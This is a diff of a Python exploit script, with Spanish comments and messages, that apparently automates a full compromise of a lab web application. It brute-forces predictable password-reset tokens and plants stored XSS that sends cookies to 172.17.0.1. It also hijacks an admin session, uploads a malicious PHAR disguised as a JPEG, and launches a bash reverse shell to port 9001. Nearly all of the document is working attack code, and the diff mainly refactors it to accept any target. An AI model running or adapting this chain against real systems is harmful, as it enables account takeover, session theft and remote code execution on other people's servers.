@@ -16,9 +16,8 @@ def handler(sig,frame):
 
 signal.signal(signal.SIGINT, handler)
 
-# Generar los tokens y hacer fuerza bruta para restablecer la constraseña
-def generateSeeds():
-    output = os.popen('date +%s%3N && sleep 1 && curl -s -X POST --url "http://172.17.0.2/forgotpassword.php" -d "username=user1" && sleep 1 && date +%s%3N').read()
+def generateSeeds(target):
+    output = os.popen(f'date +%s%3N && sleep 1 && curl -s -X POST --url "http://{target}/forgotpassword.php" -d "username=user1" && sleep 1 && date +%s%3N').read()
     seeds = re.findall("\d{13}", output)
     return seeds
 
@@ -52,17 +51,17 @@ def generateTokens():
 
 def bruteforceToken(target):
     p1 = log.progress("")
-    # payload = """bash -c 'for token in $(cat tokens.txt); do curl -X POST http://%s/resetpassword.php -d "token=$token&password1=Testing123&password2=Testing123" -x 127.0.0.1:8080; done >& /dev/null'""" % target
     url = "http://%s/resetpassword.php" % target
+    counter = 1
     with open('tokens.txt', 'r') as f:
         for token in f:
             token = token.strip()
             form_data = {'token': token, 'password1': 'Testing123', 'password2':'Testing123'}
-            p1.status(f"Probando token {token}...")
+            counter += 1
+            p1.status(f"Probando token {counter}/2126: {token}...")
             r = requests.post(url=url, data=form_data)
             if "Password changed!" in r.text:
                 p1.success(f"Contraseña reseteada con token {token}")
-                #s.headers.update({'Cookie':re.match("[^;]*", r.headers['Set-Cookie']).group(0)})
                 return
 
     p1.error("No se ha encontrado ningún token válido")
@@ -76,7 +75,6 @@ def logIn(target):
     s.headers.update({'Cookie':re.match("[^;]*", r.headers['Set-Cookie']).group(0)})
     return s
 
-# Escalar a admin mediante el XSS
 def crearIndex():
     file_content = """const req = new XMLHttpRequest();
 req.open("POST", "http://172.17.0.1/cookie?c=" + document.cookie);
@@ -141,19 +139,18 @@ def closeServer():
             subprocess.run(["kill", pid])
     exit(0)
 
-# Subir un phar en el upload image y obtener la shell
 def createImage():
     hex_value = "FFD8FFE000104A46494600010100000100010000FFDB0084000906071313121513131315161517171B1A191617181A1F1E1A1A1D181A181A1D181A181D2820181D251D1D1F21312125292B2E2E2E1F3033383330372F2F2F30010A0A0A0505050E05050E2B1913192B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2B2BFFC0001108009C000A"
     with open('image_hex_sin_espacio_v2.jpeg','w') as f:
         f.write(hex_value)
-    print("Pseudo-imagen con hex_value creada")
+    log.success("Pseudo-imagen con hex_value creada")
     return
 
 def convertHexToBytes():
-    with open('image_hex_sin_espacio_v2.jpeg','r') as f: # hexadecimal
+    with open('image_hex_sin_espacio_v2.jpeg','r') as f:
         file_content = f.read()
         file_content = file_content.strip()
-        bytesObj = codecs.decode(file_content, 'hex_codec') # hexadecimal a bytes
+        bytesObj = codecs.decode(file_content, 'hex_codec')
     return bytesObj
 
 def appendPayload(bytesObj):
@@ -170,20 +167,22 @@ def readFile():
     return file_content
 
 def uploadPhar(target,s,file_content):
-    p3 = log.progress("Subiendo PHAR malicioso...")
+    p3 = log.progress("")
+    p3.status("Subiendo PHAR malicioso...")
     time.sleep(2)
     global cookie_admin
     url = f"http://{target}/admin/upload_image.php"
-    s.headers.update({'Cookie':'PHPSESSID=q71sq8h017r10s5qt4ddb372t5'}) # pasamos de user1 a admin
+    s.headers.update({'Cookie':'PHPSESSID=q71sq8h017r10s5qt4ddb372t5'})
     files = {'image': ('script_principal.phar', file_content, 'image/jpeg')}
     s.post(url=url, files=files)
-    p3.status("Phar subido correctamente!")
+    p3.success("Phar subido correctamente!")
     return
 
-def reverseShell():
-    url = f"http://172.17.0.2/images/script_principal.phar?cmd=bash -c 'bash -i %3e%26 /dev/tcp/172.17.0.1/9001 0%3e%261'"
+def reverseShell(target):
+    url = f"http://{target}/images/script_principal.phar?cmd=bash -c 'bash -i %3e%26 /dev/tcp/172.17.0.1/9001 0%3e%261'"
     requests.get(url=url)
     return
+
 
 def removeFileExisting():
     files = ["cookie", "final_payload.phar", "generateTokens_v2.php", "image_hex_sin_espacio_v2.jpeg", "index.js", "tokens.txt"]
@@ -201,10 +200,10 @@ if __name__ == '__main__':
     parser.add_argument('-t', '--target', required=True, help="Url víctima")
     args = parser.parse_args()
     removeFileExisting()
-    seeds = generateSeeds()
+    seeds = generateSeeds(args.target)
     generateFile(seeds)
     generateTokens()
-    bruteforceToken(args.target) # funciona todo
+    bruteforceToken(args.target)
     session = logIn(args.target)
     crearIndex()
     storeXSS(session,args.target)
@@ -215,6 +214,6 @@ if __name__ == '__main__':
     appendPayload(bytesObj)
     file_content = readFile()
     uploadPhar(args.target,session,file_content)
-    threading.Thread(target=reverseShell, args=()).start()
-    shell = listen(9001,timeout=20).wait_for_connection()
+    threading.Thread(target=reverseShell, args=(args.target,)).start()
+    shell = listen(9001, timeout=20).wait_for_connection()
     shell.interactive()
